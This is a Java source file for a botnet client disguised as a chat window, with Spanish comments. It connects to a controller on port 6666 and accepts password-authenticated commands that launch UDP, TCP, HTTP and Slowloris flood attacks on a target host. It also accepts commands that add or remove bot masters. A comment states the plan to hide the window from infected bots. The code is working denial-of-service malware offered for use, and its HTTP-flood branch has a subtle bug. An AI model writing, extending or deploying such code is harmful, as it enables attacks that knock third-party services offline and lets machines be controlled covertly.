import java.net.*;
import java.util.LinkedList;
import java.io.*;
import java.awt.*;

@SuppressWarnings("deprecation")
public class ChatClient extends Frame implements Runnable {

	private static final long serialVersionUID = 1L;
	protected DataInputStream i;
	protected DataOutputStream o;
	protected TextArea output;
	protected TextField input;
	protected Thread listener;
	final static String FILE_PATH = System.getProperty("user.dir") + System.getProperty("file.separator") + "resources"
			+ System.getProperty("file.separator") + "masterPass";
	final static String DIRECTORY_PATH = System.getProperty("user.dir") + System.getProperty("file.separator") + "resources";
	static String pass = "";
	static boolean master = false;

	public ChatClient(String title, InputStream i, OutputStream o) {
		super(title);
		this.i = new DataInputStream(new BufferedInputStream(i));
		this.o = new DataOutputStream(new BufferedOutputStream(o));
		setLayout(new BorderLayout());
		add("Center", output = new TextArea());
		output.setEditable(false);
		add("South", input = new TextField());
		pack();
		// TODO -- setVisible(master); //esto cuando se acabe de debuguear y no se quiera que los bots vean la ventana de chat
		show();
		input.requestFocus();
		listener = new Thread(this);
		listener.start();
	}

	public void run() {

		String autenticacion = "";
		String comando = "";

		try {
			while (true) {
				String line = i.readUTF();
				if (line.contains("@")) {
					autenticacion = line.split("@")[0];
					comando = line.split("@")[1];
				} else {
					continue;
				}
				if (autenticar(autenticacion)) {

					String[] command = comando.split("-");
					if (command[0].contains("*")) {

						// command[0] tipo ataque || command[1] String host ||
						// command[2] long duration
						if (command[0].equals("*udpflood") && command.length == 3) {
							System.out.println("floodUDP");
							Actions.floodUDP(command[1],
							Long.valueOf(command[2]));
						}
						// command[0] tipo ataque || command[1] String host ||
						// command[2] int port || command[3] numero de thread ||
						// command[4] long duration
						else if (command[0].equals("*tcpflood") && command.length == 5) {
							System.out.println("floodTCP");
							Actions.floodTCP(command[1],
							Integer.decode(command[2]),
							Integer.decode(command[3]),
							Long.valueOf(command[4]));
						}
						// command[0] tipo ataque || command[1] String host ||
						// command[2] long duration
						else if (command[0].equals("*httpflood") && command.length == 2) {
							System.out.println("floodHTTP");
							Actions.floodHTTP(command[1],
							Long.valueOf(command[2]));
						}
						// command[0] tipo ataque || command[1] String host ||
						// command[2] int threads || command[3] int delayz
						else if (command[0].equals("*slowloris") && command.length == 4) {
							System.out.println("floodSlowLoris");
							Actions.floodSlowloris(command[1],
							Integer.decode(command[2]),
							Integer.decode(command[3]));

							// command[0] operacion || command[1] String
							// newMaster
						} else if (command[0].equals("*newmaster") && command.length == 2) {
							System.out.println("newmaster");
							Actions.addMaster(command[1], FILE_PATH );
						}

						// command[0] operacion || command[1] String delMaster
						else if (command[0].equals("*delmaster") && command.length == 2) {
							System.out.println("delmaster");
							Actions.delMaster(command[1], FILE_PATH );
						}
					}
				}

				output.appendText(line + "\n");
			}
		} catch (EOFException ex) {
			System.out.println("Servidor desconectado");
			System.exit(0);
		} catch (IOException ex) {
			ex.printStackTrace();
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			System.out.println("en finally");
			listener = null;
			input.hide();
			validate();
			try {
				o.close();
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
	}

	public boolean handleEvent(Event e) {
		if ((e.target == input) && (e.id == Event.ACTION_EVENT)) {
			try {
				o.writeUTF((String) e.arg);
				o.flush();
			} catch (IOException ex) {
				ex.printStackTrace();
				listener.stop();
			}
			input.setText("");
			return true;
		} else if ((e.target == this) && (e.id == Event.WINDOW_DESTROY)) {
			if (listener != null)
				listener.stop();
			hide();
			return true;
		}
		return super.handleEvent(e);
	}

	public static boolean autenticar(String passReceived) throws IOException {

		LinkedList<String> masters = new LinkedList<String>();

		File archivo = new File(FILE_PATH);
		FileReader fr = new FileReader(archivo);
		BufferedReader br = new BufferedReader(fr);
		String linea = "";
		while ((linea = br.readLine()) != null) {
			masters.add(linea);
		}
		br.close();

		if (masters.contains(passReceived)) {

			return true;
		}

		return false;
	}

	public static void runAction() {

	}

	public static void main(String args[]) throws IOException {

		File archivo = new File(FILE_PATH);
		BufferedWriter bw;
		String linea = "";

		if (!archivo.exists()) {
			File direct = new File(DIRECTORY_PATH);
			direct.mkdir();
			
			bw = new BufferedWriter(new FileWriter(archivo));
			bw.write("DEFECTO");
			bw.close();
			linea = "DEFECTO";
		} else {

			FileReader fr = new FileReader(archivo);
			BufferedReader br = new BufferedReader(fr);
			linea = br.readLine();
			br.close();
			if (linea.equalsIgnoreCase("") || linea.equals(null)) {
				bw = new BufferedWriter(new FileWriter(archivo));
				bw.write("DEFECTO");
				bw.close();
				linea = "DEFECTO";
			}
		}

		if (args.length == 2 && autenticar(args[1]))
			{
				master=true;
				System.out.println("Es un botmaster");
			}
		
		try {
			@SuppressWarnings("resource")
			Socket s = new Socket(args[0], 6666);
			new ChatClient("Chat " + args[0] + ":" + 6666, s.getInputStream(), s.getOutputStream());
		} catch (ConnectException ex) {
			System.out.println("No se puede establecer la conexión con el servidor");
		} catch (Exception ex){
			ex.printStackTrace();
		}		
		
	}
}